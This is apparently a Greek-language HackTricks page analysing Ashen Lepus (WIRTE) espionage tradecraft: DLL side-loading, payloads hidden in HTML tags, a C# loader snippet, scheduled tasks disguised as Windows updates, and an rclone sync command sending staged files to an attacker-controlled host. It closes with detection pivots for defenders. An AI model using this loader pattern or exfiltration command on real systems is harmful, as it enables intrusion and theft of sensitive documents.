# Προηγμένο DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση Tradecraft

Ashen Lepus (aka WIRTE) εκμεταλλεύτηκε ένα επαναλαμβανόμενο πρότυπο που συνδέει DLL sideloading, staged HTML payloads, και modular .NET backdoors για να παραμείνει μέσα σε διπλωματικά δίκτυα της Μέσης Ανατολής. Η τεχνική είναι επαναχρησιμοποιήσιμη από οποιονδήποτε χειριστή επειδή βασίζεται σε:

- **Archive-based social engineering**: αθώα αρχεία PDF ζητούν από τα θύματα να κατεβάσουν ένα RAR archive από μια υπηρεσία κοινής χρήσης αρχείων. Το archive περιέχει ένα πραγματικό-φαίνονται viewer EXE, μια κακόβουλη DLL με όνομα αξιόπιστης βιβλιοθήκης (π.χ. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), και ένα παραπλανητικό `Document.pdf`.
- **DLL search order abuse**: το θύμα κάνει διπλό κλικ στο EXE, τα Windows επιλύουν την DLL import από τον τρέχοντα κατάλογο, και ο κακόβουλος loader (AshenLoader) εκτελείται μέσα στη trusted process ενώ το παραπλανητικό PDF ανοίγει για να αποφευχθεί υποψία.
- **Living-off-the-land staging**: κάθε επόμενο στάδιο (AshenStager → AshenOrchestrator → modules) κρατιέται off-disk μέχρι να χρειαστεί, παραδίδεται ως κρυπτογραφημένα blobs κρυμμένα μέσα σε διαφορετικά αβλαβείς HTML responses.

## Αλυσίδα Πολλαπλών Σταδίων Side-Loading

1. **Decoy EXE → AshenLoader**: το EXE side-loads το AshenLoader, το οποίο διεξάγει host recon, το κρυπτογραφεί με AES-CTR, και το POSTάρει μέσα σε μεταβαλλόμενες παραμέτρους όπως `token=`, `id=`, `q=`, ή `auth=` προς API-looking paths (π.χ. `/api/v2/account`).
2. **HTML extraction**: το C2 αποκαλύπτει το επόμενο στάδιο μόνο όταν η IP του client γεωεντοπιστεί στην στοχευμένη περιοχή και το `User-Agent` ταιριάζει με το implant, δυσκολεύοντας sandboxes. Όταν οι έλεγχοι περάσουν, το HTTP body περιέχει ένα `<headerp>...</headerp>` blob με το Base64/AES-CTR κρυπτογραφημένο AshenStager payload.
3. **Second sideload**: το AshenStager αναπτύσσεται μαζί με ένα άλλο νόμιμο binary που εισάγει `wtsapi32.dll`. Η κακόβουλη αντιγραφή που εγχέεται στο binary ανακτά επιπλέον HTML, αυτή τη φορά σκάβοντας `<article>...</article>` για να ανακτήσει το AshenOrchestrator.
4. **AshenOrchestrator**: ένας modular .NET controller που αποκωδικοποιεί ένα Base64 JSON config. Τα πεδία `tg` και `au` του config συνενώνονται/χασάρονται για να δημιουργήσουν το AES key, το οποίο αποκρυπτογραφεί το `xrk`. Τα προκύπτοντα bytes λειτουργούν ως XOR key για κάθε module blob που ανακτάται μετά.
5. **Module delivery**: κάθε module περιγράφεται μέσω HTML comments που ανακατευθύνουν τον parser σε ένα οποιοδήποτε tag, παρακάμπτοντας στατικούς κανόνες που ψάχνουν μόνο για `<headerp>` ή `<article>`. Τα modules περιλαμβάνουν persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), και file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Ακόμα κι αν οι αμυνόμενοι μπλοκάρουν ή αφαιρέσουν ένα συγκεκριμένο στοιχείο, ο χειριστής χρειάζεται μόνο να αλλάξει το tag που υπαινίσσεται το σχόλιο HTML για να συνεχίσει την παράδοση.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: οι τρέχοντες loaders ενσωματώνουν 256-bit keys plus nonces (π.χ., `{9a 20 51 98 ...}`) και προαιρετικά προσθέτουν ένα XOR layer χρησιμοποιώντας strings όπως `msasn1.dll` πριν/μετά την αποκρυπτογράφηση.
- **Recon smuggling**: τα καταγεγραμμένα δεδομένα πλέον περιλαμβάνουν λίστες Program Files για να εντοπίζονται εφαρμογές υψηλής αξίας και πάντα κρυπτογραφούνται πριν φύγουν από το host.
- **URI churn**: query parameters και REST paths περιστρέφονται μεταξύ καμπανιών (`/api/v1/account?token=` → `/api/v2/account?auth=`), ακυρώνοντας εύθραυστες ανιχνεύσεις.
- **Gated delivery**: οι servers είναι geo-fenced και απαντούν μόνο σε πραγματικά implants. Μη εγκεκριμένοι clients λαμβάνουν μη-ύποπτο HTML.

## Persistence & Execution Loop

AshenStager drops scheduled tasks που προσποιούνται ότι είναι εργασίες συντήρησης των Windows και εκτελούνται μέσω `svchost.exe`, π.χ.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Αυτές οι εργασίες επανεκκινούν την sideloading chain κατά το boot ή σε διαστήματα, εξασφαλίζοντας ότι το AshenOrchestrator μπορεί να ζητήσει fresh modules χωρίς να αγγίξει ξανά το δίσκο.

## Using Benign Sync Clients for Exfiltration

Οι χειριστές τοποθετούν diplomatic documents μέσα στο `C:\Users\Public` (world-readable και non-suspicious) μέσω ενός dedicated module, και στη συνέχεια κατεβάζουν το νόμιμο [Rclone](https://rclone.org/) binary για να συγχρονίσουν αυτόν τον κατάλογο με attacker storage:

1. **Stage**: αντιγράψτε/συλλέξτε τα αρχεία-στόχους στο `C:\Users\Public\{campaign}\`.
2. **Configure**: αποστείλετε ένα Rclone config που δείχνει σε ένα attacker-controlled HTTPS endpoint (π.χ., `api.technology-system[.]com`).
3. **Sync**: τρέξτε `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` ώστε η κίνηση να μοιάζει με κανονικά cloud backups.

Επειδή το Rclone χρησιμοποιείται ευρέως για νόμιμα backup workflows, οι αμυνόμενοι πρέπει να εστιάσουν σε ανώμαλες εκτελέσεις (νέα binaries, περίεργα remotes, ή ξαφνικός συγχρονισμός του `C:\Users\Public`).

## Detection Pivots

- Alert on **signed processes** που απρόσμενα φορτώνουν DLLs από user-writable paths (Procmon filters + `Get-ProcessMitigation -Module`), ειδικά όταν τα ονόματα DLL επικαλύπτονται με `netutils`, `srvcli`, `dwampi`, ή `wtsapi32`.
- Επιθεωρήστε ύποπτες HTTPS responses για **large Base64 blobs embedded inside unusual tags** ή προστατευμένα από σχόλια `<!-- TAG: <xyz> -->`.
- Hunt for **scheduled tasks** που τρέχουν `svchost.exe` με non-service arguments ή δείχνουν πίσω σε dropper directories.
- Monitor for **Rclone** binaries που εμφανίζονται εκτός IT-managed τοποθεσιών, νέα `rclone.conf` αρχεία, ή sync jobs που τραβάνε από staging directories όπως `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

{{#include ../../../banners/hacktricks-training.md}}
